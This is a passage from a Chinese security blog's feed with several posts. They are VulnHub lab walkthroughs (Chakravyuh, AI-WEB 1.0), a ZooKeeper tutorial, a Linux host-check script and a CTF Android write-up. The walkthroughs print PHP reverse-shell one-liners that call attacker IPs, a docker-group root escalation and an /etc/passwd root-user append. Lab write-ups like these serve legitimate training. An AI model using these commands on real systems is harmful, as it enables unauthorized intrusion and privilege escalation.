    <title>Linux主机安全检查脚本</title>
    <link href="/2019/11/Linux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/"/>
    <id>/2019/11/Linux主机安全检查脚本/</id>
    <published>2019-11-22T07:36:57.000Z</published>
    <updated>2019-11-22T07:42:57.493Z</updated>
    
    <content type="html"><![CDATA[<h3 id="检查项"><a href="#检查项" class="headerlink" title="检查项"></a>检查项</h3><pre><code>0.检测命令是否被修改1.获取网络连接2.查看对外开放端口3.查看是否存在高危端口4.查看启动项5.查看定时任务6.查看调度任务7.检测cpu异常进程8.检测特权用户9.查看登陆用户10.可登录用户11.最近修改过的文件12.查看是否存在可疑命令13.root是否允许远程登陆14.检查是否存在可疑脚本15.日志文件打包16.查看登陆到主机的用户17.检查磁盘使用量</code></pre><p>以上检查项按照比较关心的项来写，在Ubuntu主机上测试，个别命令可能centos不带，需要提前安装。</p><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>项目地址：<a href="https://github.com/MisakiKata/Linuxcheck" target="_blank" rel="noopener">https://github.com/MisakiKata/Linuxcheck</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>其中还包括一批后门端口，利用来自：<a href="https://github.com/T0xst/linux/blob/master/checkrules/dangerstcpports.dat" target="_blank" rel="noopener">port列表</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;检查项&quot;&gt;&lt;a href=&quot;#检查项&quot; class=&quot;headerlink&quot; title=&quot;检查项&quot;&gt;&lt;/a&gt;检查项&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;0.检测命令是否被修改
1.获取网络连接
2.查看对外开放端口
3.查看是否存在高危端口
4.查看启动项
5.查看定
      
    
    </summary>
    
    
      <category term="shell" scheme="/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub Chakravyuh</title>
    <link href="/2019/11/vulnhub-Chakravyuh/"/>
    <id>/2019/11/vulnhub-Chakravyuh/</id>
    <published>2019-11-15T07:15:22.000Z</published>
    <updated>2019-11-25T09:30:06.073Z</updated>
    
    <content type="html"><![CDATA[<p>修改网络连接方式为DHCP</p><p>按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138</p><h2 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h2><p>按照惯例，首先把主机开放端口扫描，发现开放端口为80、22、65530。其中65530是一个ftp服务，连接发现无密码，文件夹pub下存在一个arjun.7z的压缩包。</p><p><img src="https://i.loli.net/2019/11/15/skYyTa64x5tFiwp.png" alt="1573710199259.png"></p><p>访问80端口，就一张图片，扫描路径，发现phpmyadmin。无空密码。</p><p><img src="https://i.loli.net/2019/11/15/BSExeVdhqk5K8jX.png" alt="1573710258221.png"></p><p><img src="https://i.loli.net/2019/11/15/7UdzvtM8eFGWHrh.png" alt="1573710267644.png"></p><h3 id="爆破压缩包"><a href="#爆破压缩包" class="headerlink" title="爆破压缩包"></a>爆破压缩包</h3><p>到此，需要一个能登陆phpmyadmin的账号密码。尝试爆破7z压缩包。利用一个小脚本爆破。</p><p>根据脚本的建议，需要一份字典，<code>rockyou</code> or <code>crackstation</code>。是kali上的字典，但是手头没有kali。直接搜索下载。</p><p><a href="https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt" target="_blank" rel="noopener">https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt</a></p><p>爆破是贼慢，但是密码成功出来了，是family。打开是一个secret.txt文件，里面有一个类似base64加密的字符串。</p><p><img src="https://i.loli.net/2019/11/15/rden5chWPaXNmzH.png" alt="1573716758046.png"></p><p>字符串为以下，看起来是账号：邮箱：密码。不过遗憾的是，并不能登陆phpmyadmin。那这个字符串就可能是字段：账号：密码的形式。</p><pre><code>Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=解码为：gila:admin@gmail.com:princesa</code></pre><h2 id="利用已知漏洞"><a href="#利用已知漏洞" class="headerlink" title="利用已知漏洞"></a>利用已知漏洞</h2><p>后来试一下路径，发现存在这个一个地址，gila是一个cms。</p><pre><code>http://192.168.120.138/gila/</code></pre><p><img src="https://i.loli.net/2019/11/15/C3tO6HmuqhbzSZj.png" alt="1573788590873.png"><br>到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。</p><pre><code>http://192.168.120.138/gila/admin</code></pre><p><img src="https://i.loli.net/2019/11/15/j2xpDA1v7XqBkoT.png" alt="1573788693246.png"></p><p>登陆后，看到版本为1.10.9。基本可以确定是一个后台获取webshell的利用方式，搜索谷歌，查找一下是否有已知的漏洞。在exploit-db上找到了一个本地文件包含漏洞。尝试确实存在，而已可以上传文件。查看一下发现是content下的文件管理功能。</p><pre><code>http://192.168.120.138/gila/admin/fm?f=./..</code></pre><p><img src="https://i.loli.net/2019/11/15/ig9yuJs3EHr7mpS.png" alt="1573788989941.png"></p><h3 id="利用上传文件"><a href="#利用上传文件" class="headerlink" title="利用上传文件"></a>利用上传文件</h3><p>创建新文件后门。在assert文件夹下，但是php文件不能访问，需要修改.htaccess文件。</p><p><img src="https://i.loli.net/2019/11/15/HpAKf6RXyNrShJ2.png" alt="1573789346619.png"></p><p>修改为<code>Allow from all</code>，即可访问上传的文件。</p><p><img src="https://i.loli.net/2019/11/15/2jIiJDk3G4yagWz.png" alt="1573789391147.png"></p><h2 id="反弹shell获取权限"><a href="#反弹shell获取权限" class="headerlink" title="反弹shell获取权限"></a>反弹shell获取权限</h2><p>利用php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.30.79&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;#升级shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code></pre><p><img src="https://i.loli.net/2019/11/15/L7qnsAzGgY3T9df.png" alt="1573798182649.png"></p><p>从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考</p><p><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170783.html</a></p><p>借助一个docker镜像，查看本机存在一个alpine镜像</p><p><img src="https://i.loli.net/2019/11/15/QkOp8Kcxt6MnfBP.png" alt="1573799916611.png"></p><p>采用-v的目录映射，此处修改为/root:/root，运行进入docker内部</p><pre><code>docker run -it --rm -v /root:/root alpine</code></pre><p><img src="https://i.loli.net/2019/11/15/192nqWMVgFcBtrS.png" alt="1573800551863.png"></p><p>找到root下的文件，打开即可</p><p><img src="https://i.loli.net/2019/11/15/bBqVHw2TS7k3smR.png" alt="1573800574456.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;修改网络连接方式为DHCP&lt;/p&gt;
&lt;p&gt;按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138&lt;/p&gt;
&lt;h2 id=&quot;信息发现&quot;&gt;&lt;a href=&quot;#信息发现&quot; class=&quot;headerlink&quot; title=&quot;信息发现&quot;&gt;&lt;/a&gt;信息发现&lt;/h
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ZooKeeper</title>
    <link href="/2019/11/ZooKeeper/"/>
    <id>/2019/11/ZooKeeper/</id>
    <published>2019-11-15T07:11:39.000Z</published>
    <updated>2019-11-15T08:08:28.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是Apache-ZooKeeper？"><a href="#什么是Apache-ZooKeeper？" class="headerlink" title="什么是Apache ZooKeeper？"></a>什么是Apache ZooKeeper？</h2><p>Apache ZooKeeper是由集群（节点组）使用的一种服务，用于在自身之间协调，并通过稳健的同步技术维护共享数据。ZooKeeper本身是一个分布式应用程序，为写入分布式应用程序提供服务。</p><p>ZooKeeper提供的常见服务如下 :</p><ul><li><strong>命名服务</strong> - 按名称标识集群中的节点。它类似于DNS，但仅对于节点。</li><li><strong>配置管理</strong> - 加入节点的最近的和最新的系统配置信息。</li><li><strong>集群管理</strong> - 实时地在集群和节点状态中加入/离开节点。</li><li><strong>选举算法</strong> - 选举一个节点作为协调目的的leader。</li><li><strong>锁定和同步服务</strong> - 在修改数据的同时锁定数据。此机制可帮助你在连接其他分布式应用程序（如Apache HBase）时进行自动故障恢复。</li><li><strong>高度可靠的数据注册表</strong> - 即使在一个或几个节点关闭时也可以获得数据。</li></ul><p>分布式应用程序提供了很多好处，但它们也抛出了一些复杂和难以解决的挑战。ZooKeeper框架提供了一个完整的机制来克服所有的挑战。竞争条件和死锁使用<strong>故障安全同步方法</strong>进行处理。另一个主要缺点是数据的不一致性，ZooKeeper使用<strong>原子性</strong>解析。</p><h2 id="ZooKeeper的好处"><a href="#ZooKeeper的好处" class="headerlink" title="ZooKeeper的好处"></a>ZooKeeper的好处</h2><p>以下是使用ZooKeeper的好处：</p><ul><li><strong>简单的分布式协调过程</strong></li><li><strong>同步</strong> - 服务器进程之间的相互排斥和协作。此过程有助于Apache HBase进行配置管理。</li><li><strong>有序的消息</strong></li><li><strong>序列化</strong> - 根据特定规则对数据进行编码。确保应用程序运行一致。这种方法可以在MapReduce中用来协调队列以执行运行的线程。</li><li><strong>可靠性</strong></li><li><strong>原子性</strong> - 数据转移完全成功或完全失败，但没有事务是部分的。</li></ul><h2 id="Java环境"><a href="#Java环境" class="headerlink" title="Java环境"></a>Java环境</h2><p>最新版zookeeper需要Java1.8.211以上。</p><p>比如利用源安装</p><pre><code>yum install java-1.8.0-openjdk.x86_64java -versionopenjdk version &quot;1.8.0_232&quot;</code></pre><h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>地址：<a href="https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.6/apache-zookeeper-3.5.6-bin.tar.gz" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.6/apache-zookeeper-3.5.6-bin.tar.gz</a></p><p>解压缩，进入conf目录修改zoo-sample.cfg文件为zoo.cfg文件。</p><p>打开文件，修改路径，类似如下</p><pre><code># The number of milliseconds of each ticktickTime=2000# The number of ticks that the initial# synchronization phase can takeinitLimit=10# The number of ticks that can pass between# sending a request and getting an acknowledgementsyncLimit=5# the directory where the snapshot is stored.# do not use /tmp for storage, /tmp here is just# example sakes.dataDir=/data/zookeeper# the port at which the clients will connectclientPort=2181# the maximum number of client connections.# increase this if you need to handle more clients#maxClientCnxns=60## Be sure to read the maintenance section of the# administrator guide before turning on autopurge.## http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance## The number of snapshots to retain in dataDir#autopurge.snapRetainCount=3# Purge task interval in hours# Set to &quot;0&quot; to disable auto purge feature#autopurge.purgeInterval=1</code></pre><p>保存，到bin目录下执行</p><pre><code>[root@VM_0_6_centos bin]# ./zkServer.sh start/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /root/apache-zookeeper-3.5.6-bin/bin/../conf/zoo.cfgStarting zookeeper ... STARTED</code></pre><p>开始服务后，启动cli端。</p><pre><code>[root@VM_0_6_centos bin]# ./zkCli.sh /usr/bin/javaConnecting to localhost:2181</code></pre><h3 id="创建Znode节点"><a href="#创建Znode节点" class="headerlink" title="创建Znode节点"></a>创建Znode节点</h3><pre><code>create /path /dataeg: [zk: localhost:2181(CONNECTED) 4] create /datapp zookapp    Created /datapp</code></pre><h3 id="创建顺序节点"><a href="#创建顺序节点" class="headerlink" title="创建顺序节点"></a>创建顺序节点</h3><pre><code>create -e /path /dataeg: [zk: localhost:2181(CONNECTED) 5] create -s /datapp zookapp    Created /datapp0000000003</code></pre><h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><pre><code>[zk: localhost:2181(CONNECTED) 6] delete /datapp [zk: localhost:2181(CONNECTED) 7] ls /datappNode does not exist: /datapp#删除带子节点的节点[zk: localhost:2181(CONNECTED) 30] ls /datapp[sec][zk: localhost:2181(CONNECTED) 33] deleteall /datapp[zk: localhost:2181(CONNECTED) 34] </code></pre><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><pre><code>[zk: localhost:2181(CONNECTED) 11] get /datapp zookapp[zk: localhost:2181(CONNECTED) 13] get -s /datapp    #查看全部数据zookappcZxid = 0xcctime = Thu Nov 07 11:10:41 CST 2019mZxid = 0xcmtime = Thu Nov 07 11:10:41 CST 2019pZxid = 0xccversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x0dataLength = 7numChildren = 0[zk: localhost:2181(CONNECTED) 18] set /datapp zookupdate   #设置更改WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp[zk: localhost:2181(CONNECTED) 19] get -w /datapp    #查看更改zookupdate[zk: localhost:2181(CONNECTED) 20] set /datapp cversion=1WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp[zk: localhost:2181(CONNECTED) 21] get -w /datappcversion=1</code></pre><h3 id="设置数据"><a href="#设置数据" class="headerlink" title="设置数据"></a>设置数据</h3><pre><code>[zk: localhost:2181(CONNECTED) 18] set /datapp zookupdateWATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp[zk: localhost:2181(CONNECTED) 19] get -w /datappzookupdate</code></pre><h3 id="创建子节点"><a href="#创建子节点" class="headerlink" title="创建子节点"></a>创建子节点</h3><pre><code>[zk: localhost:2181(CONNECTED) 28] create /datapp zookappCreated /datapp[zk: localhost:2181(CONNECTED) 29] create /datapp/sec zookapp2Created /datapp/sec[zk: localhost:2181(CONNECTED) 30] ls /datapp[sec][zk: localhost:2181(CONNECTED) 31] get /datappzookapp[zk: localhost:2181(CONNECTED) 32] get /datapp/seczookapp2</code></pre><h2 id="Zookeeper集群部署"><a href="#Zookeeper集群部署" class="headerlink" title="Zookeeper集群部署"></a>Zookeeper集群部署</h2><p>此处利用一台主机模拟两个zookeeper部署，在root目录下创建两个文件夹， 一个为zookeeper1，一个为zookeeper2。而实际环境中最小需要三个节点，最好是奇数节点。</p><p>创建data目录，在conf配置文件中修改如下，端口由于是在一台主机上，所以需要不同的端口，正常形式下，可以设置为不同IP同端口。</p><pre><code># The number of milliseconds of each ticktickTime=2000# The number of ticks that the initial# synchronization phase can takeinitLimit=10# The number of ticks that can pass between# sending a request and getting an acknowledgementsyncLimit=5# the directory where the snapshot is stored.# do not use /tmp for storage, /tmp here is just# example sakes.dataDir=/data/zookeeper1# the port at which the clients will connectclientPort=2181# the maximum number of client connections.# increase this if you need to handle more clients#maxClientCnxns=60## Be sure to read the maintenance section of the# administrator guide before turning on autopurge.## http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance## The number of snapshots to retain in dataDir#autopurge.snapRetainCount=3# Purge task interval in hours# Set to &quot;0&quot; to disable auto purge feature#autopurge.purgeInterval=1server.1=127.0.0.1:7788:8890server.2=127.0.0.1:7789:8891</code></pre><h3 id="创建data-myid文件"><a href="#创建data-myid文件" class="headerlink" title="创建data/myid文件"></a>创建data/myid文件</h3><p>创建文件myid，写入配置文件中的server名。文件的存在位置跟配置文件中的dataDir一致。</p><pre><code>[root@VM_0_6_centos zookeeper1]# echo &quot;1&quot; &gt; myid[root@VM_0_6_centos zookeeper1]# lsmyid</code></pre><p>分别启动后查看状态可以发现，已经选举了一个为leader</p><pre><code>[root@VM_0_6_centos zookeeper2]# ./bin/zkServer.sh status/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /root/zookeeper2/bin/../conf/zoo.cfgClient port found: 2182. Client address: localhost.Mode: leader[root@VM_0_6_centos zookeeper1]# ./bin/zkServer.sh status/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /root/zookeeper1/bin/../conf/zoo.cfgClient port found: 2181. Client address: localhost.Mode: follower</code></pre><p>在leader端修改数据，新建znode节点</p><pre><code>[zk: localhost:2181(CONNECTED) 0] create /datapp idsignCreated /datapp[zk: localhost:2181(CONNECTED) 1] follow端[zk: localhost:2181(CONNECTED) 0] get /datappidsign[zk: localhost:2181(CONNECTED) 1]</code></pre><p>follow端修改数据，leader端同步到数据，向其他follow写入数据</p><pre><code>[zk: localhost:2181(CONNECTED) 1] set /datapp idsign=xxxx[zk: localhost:2181(CONNECTED) 0] get /datappidsign=xxxx[zk: localhost:2181(CONNECTED) 1] </code></pre><h2 id="ZooKeeper-API"><a href="#ZooKeeper-API" class="headerlink" title="ZooKeeper API"></a>ZooKeeper API</h2><p>官方提供了绑定Java和C的API，此处不做使用解释。以下以python的API使用为例。</p><p>Java版文档：<a href="http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/ZooKeeper.html" target="_blank" rel="noopener">http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/ZooKeeper.html</a></p><p>Java示例：<a href="https://blog.csdn.net/u013468915/article/details/80878490" target="_blank" rel="noopener">https://blog.csdn.net/u013468915/article/details/80878490</a></p><p>python版文档：<a href="https://kazoo.readthedocs.io/en/latest/install.html" target="_blank" rel="noopener">https://kazoo.readthedocs.io/en/latest/install.html</a></p><pre><code>pip install kazoo  #安装kazoo</code></pre><p>连接到ZooKeeper</p><pre><code>from kazoo.client import KazooClientzk = KazooClient(hosts=&#39;106.54.181.187:2181&#39;)   #连接zk.start()</code></pre><p>节点状态</p><pre><code>from kazoo.client import KazooStatedef my_listener(state):    if state == KazooState.LOST:        print(&#39;ZooKeeper Lost&#39;)                     # 状态为丢失时    elif state == KazooState.SUSPENDED:        print(&#39;ZooKeeper Suspended&#39;)                # 状态为暂停    else:        print(&#39;ZooKeeper Connect&#39;)                  # 状态为连接中zk.add_listener(my_listener)</code></pre><p>Zookeeper 3.4及更高版本支持只读模式。 必须为Zookeeper集群中的服务器打开此模式，客户端才能使用它。 要将这种模式与Kazoo一起使用，应在read_only选项设置为True的情况下调用KazooClient。 这将使客户端连接到已变为只读的Zookeeper节点，并且客户端将继续扫描其他可读写的节点。</p><pre><code>from kazoo.client import KazooClientfrom kazoo.client import KazooStatefrom kazoo.client import KeeperStatezk = KazooClient(hosts=&#39;127.0.0.1:2181&#39;, read_only=True)zk.start()@zk.add_listenerdef watch_for_ro(state):    if state == KazooState.CONNECTED:        if zk.client_state == KeeperState.CONNECTED_RO:            print(&quot;Read only mode!&quot;)        else:            print(&quot;Read/Write mode!&quot;)</code></pre><p>创建节点，使用的方法有<code>ensure_path()</code>和<code>create()</code></p><pre><code># 确定路径，在必要时创建zk.ensure_path(&quot;/my/favorite&quot;)# 用数据创建一个节点zk.create(&quot;/my/favorite/node&quot;, b&quot;a value&quot;)</code></pre><p>读取节点信息</p><pre><code>exists() 检查节点是否存在。get() 在ZnodeStat结构中获取节点的数据以及详细的节点信息。get_children() 获取给定节点的子级列表eg:if zk.exists(&quot;/my/favorite&quot;):         #判断/my/favorite是否存在data, stat = zk.get(&quot;/my/favorite&quot;)        #查看节点信息print(&quot;Version: %s, data: %s&quot; % (stat.version, data.decode(&quot;utf-8&quot;)))children = zk.get_children(&quot;/my/favorite&quot;)  #查看节点的子节点信息print(&quot;There are %s children with names %s&quot; % (len(children), children))</code></pre><p>更新节点信息</p><pre><code>zk.set(&quot;/my/favorite&quot;, b&quot;some data&quot;)</code></pre><p>删除节点信息</p><pre><code>zk.delete(&quot;/my/favorite/node&quot;, recursive=True)</code></pre><p>重试命令</p><pre><code>result = zk.retry(zk.get, &quot;/path/to/node&quot;)相当于执行zk.get(&#39;/path/to/node&#39;)</code></pre><p>利用如上信息，编写操作ZooKeeper的Python脚本</p><pre><code>#coding:utf-8from kazoo.client import KazooClientclass zoocon:    def __init__(self):        self.zk = KazooClient(hosts=&#39;106.54.181.187:2181&#39;)   #连接        self.zk.start()        self.path = &#39;/datapp&#39;    def get_data(self):        res = self.zk.get(self.path)        print(res)    def exist(self):        self.zk.exists(self.path)        return True    def create_data(self):        self.zk.create(self.path, b&#39;signapp&#39;)    def close(self):        self.zk.close()    def delete(self):        self.zk.delete(self.path, recursive=True)if __name__ == &#39;__main__&#39;:    zks = zoocon()    if zks.exist():        zks.delete()        zks.close()        print &#39;path delete&#39;    else:        zks.create_data()        zks.get_data()        zks.close()</code></pre><p>服务端存在datapp节点，运行后删除节点，当在服务器查看时，显示如下</p><pre><code>[zk: localhost:2181(CONNECTED) 0] get /datapporg.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode = NoNode for /datapp</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是Apache-ZooKeeper？&quot;&gt;&lt;a href=&quot;#什么是Apache-ZooKeeper？&quot; class=&quot;headerlink&quot; title=&quot;什么是Apache ZooKeeper？&quot;&gt;&lt;/a&gt;什么是Apache ZooKeeper？&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub AI WEB 1.0</title>
    <link href="/2019/11/AI-WEB%201.0/"/>
    <id>/2019/11/AI-WEB 1.0/</id>
    <published>2019-11-06T08:39:05.000Z</published>
    <updated>2019-11-25T09:29:51.997Z</updated>
    
    <content type="html"><![CDATA[<p>加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。</p><p>扫描端口发现只有80的对外开放端口，访问发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682029896.png" alt="1572682029896"></p><p>扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。</p><p><img src="/2019/11/AI-WEB 1.0/1572682020738.png" alt="1572682020738"></p><p>访问其中地址，403</p><p><img src="/2019/11/AI-WEB 1.0/1572682335561.png" alt="1572682335561"></p><p>介于是403尝试访问上一级发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682385016.png" alt="1572682385016"></p><p>尝试输入1，发现显示admin用户，那就是说可能这是个注入点。</p><p><img src="/2019/11/AI-WEB 1.0/1572682438951.png" alt="1572682438951"></p><p>检查是否存在注入，发现存在</p><p><img src="/2019/11/AI-WEB 1.0/1572683771039.png" alt="1572683771039"></p><p>查询systemUser库发现三个用户</p><p><img src="/2019/11/AI-WEB 1.0/1572688569479.png" alt="1572688569479"></p><pre><code>t00r      | FakeUserPassw0rd                    aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sau3er      | N0tThis0neAls0</code></pre><p>扫描路径m3diNf0下的文件，发现如下地址。</p><pre><code>http://192.168.111.132/m3diNf0/info.php </code></pre><p>找到物理地址，利用sqlmap写shell</p><p><img src="/2019/11/AI-WEB 1.0/1572705709726.png" alt="1572705709726"></p><p>把给的路径加上物理地址都试一圈，发现如下地址是可写的。</p><pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></pre><p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p><pre><code>http://192.168.111.132/se3reTdir777/uploads/a.php</code></pre><p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191102234632541.png" alt="image-20191102234632541"></p><p>查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103002714448.png" alt="image-20191103002714448"></p><p>但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。</p><p>后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103012733428.png" alt="image-20191103012733428"></p><p>这么说我这个账号还是多余的用来。</p><p>利用perl来生成加密的密码，账号密码admin</p><pre><code>perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  //12wGaKkN1hGuwadmin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash</code></pre><p>直接在蚁剑中追加一行</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013158615.png" alt="image-20191103013158615"></p><p>sudo过来就已经是root权限</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013307387.png" alt="image-20191103013307387"></p><p>找到flag</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013329582.png" alt="image-20191103013329582"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。&lt;/p&gt;
&lt;p&gt;扫描端口发现只有80的对外开放端口，访问发现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/11/AI-WEB 1.0/1572682029896.png&quot; alt=&quot;1572682
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>GitHub-Monitor</title>
    <link href="/2019/11/GitHub-Monitor/"/>
    <id>/2019/11/GitHub-Monitor/</id>
    <published>2019-11-06T04:41:49.000Z</published>
    <updated>2019-11-06T04:41:49.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GITHUB-MONTIOR"><a href="#GITHUB-MONTIOR" class="headerlink" title="GITHUB_MONTIOR"></a>GITHUB_MONTIOR</h2><blockquote><p>  python3 + Django 2.2.6 + supervisord</p></blockquote><ol><li>环境由简单的Django完成，外加一个HTML展示模板</li><li>GitHub的爬虫由supervisord来维护，需要修改配置文件内的信息，可以改成/var/run路径</li><li>pip安装如下的文件即可</li></ol><p>爬虫需要账号密码模拟登陆，进程为五分钟一次。是否扫描根据任务数据里保存的时间来做判断。</p><p>修改任务只需要在编辑里输入任务名，直接输入其他参数更新即可。</p><p>数据库采用MySQL5.7。</p><pre><code>python3 manager.py createsuperuserpython3 manager.py makemigrationspython3 manager.py migrate登陆后台添加一个可以登陆前端的账号即可。</code></pre><p>地址：<a href="https://github.com/MisakiKata/github_monitor" target="_blank" rel="noopener">https://github.com/MisakiKata/github_monitor</a></p><p>首界面</p><p><img src="https://user-images.githubusercontent.com/27627614/68268529-83d12080-0091-11ea-8956-988a74a77da4.png" alt="1573011489137"></p><p>全部信息<img src="https://user-images.githubusercontent.com/27627614/68268531-8764a780-0091-11ea-8269-0288c1c879cb.png" alt="1573011512652"></p><p>未处理信息</p><p><img src="https://user-images.githubusercontent.com/27627614/68268533-8764a780-0091-11ea-8231-30c8635d2067.png" alt="1573011525234"></p><p>界面由于对js了解较少，没有采用比较nodejs类前端框架，当然也可以修改为自己喜欢的界面。</p><p>食用简单，望喜欢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GITHUB-MONTIOR&quot;&gt;&lt;a href=&quot;#GITHUB-MONTIOR&quot; class=&quot;headerlink&quot; title=&quot;GITHUB_MONTIOR&quot;&gt;&lt;/a&gt;GITHUB_MONTIOR&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;  python3
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2018SUSCTF-Mobile题</title>
    <link href="/2019/10/2018SUSCTF-Mobile%E9%A2%98/"/>
    <id>/2019/10/2018SUSCTF-Mobile题/</id>
    <published>2019-10-23T08:29:20.000Z</published>
    <updated>2019-10-23T08:29:20.575Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BabyAndroid"><a href="#BabyAndroid" class="headerlink" title="BabyAndroid"></a>BabyAndroid</h3><p>常规，JEB反编译</p><p><img src="https://i.loli.net/2019/10/23/XkQ8eD4UpbhTJ27.png" alt="1571714446839.png"></p><p>根据输入的字符串长度，第一位和97异或，后面跟v0的字符异或，把结果字符串转入a函数中。a函数首先把给出的常量字符串转为数组，把传入的字符串转化为bytes数组，再根据数组长度把每一位做for中&amp;和左移计算，结果为3267347723651E492C1D7E117C1946325D02432D493B0B62067B则为真。所以逆推，由于一次计算拼接两位，所以按照两位为一个字符计算。其中含有字母，调试得知是对应的十六进制数。</p><pre><code>#coding:utf-8strs = &quot;3267347723651E492C1D7E117C1946325D02432D493B0B62067B&quot;num = []for i in range(0, len(strs)):    num.append(strs[i])   #52nums = []id = 0while id &lt; 52:    for i in range(0,200):        if str((i &amp; 0xF0) &gt;&gt; 4) == num[id]:            if hex(i &amp; 15).replace(&#39;0x&#39;,&#39;&#39;).upper() == num[id+1]:                nums.append(i)                break    id = id + 2flag = []for i in range(0, len(nums)):    if i == 0:        first = nums[i] ^ 97        flag.append(first)    else:        sc = nums[i] ^ nums[i-1]        flag.append(sc)text = &#39;&#39;for i in flag:    text = text + chr(i)print(text)&gt;&gt;&gt; SUSCTF{We1come_to_Andr0id}</code></pre><p>后来看了其他资料，才发现a函数下面的for循环就是找16进制对应的十进制数，如</p><pre><code>&gt;&gt;&gt; int(&#39;32&#39;,16)50其中是利用50找到对应的十进制32.</code></pre><p>这个点卡了N久，看到一份别人的poc写的是相当简洁了。</p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>又是一个native层的APP。</p><p><img src="https://i.loli.net/2019/10/23/KqBnWwjlIS5kEY3.png" alt="1571734248316.png"></p><p>IDA打开伪代码</p><p><img src="https://i.loli.net/2019/10/23/hRUCb7HDjaY8VXx.png" alt="1571801738496.png"></p><p>根据汇编得知，中间for循环处操作的是数组</p><p><img src="https://i.loli.net/2019/10/23/UQV7blA3npsyeIh.png" 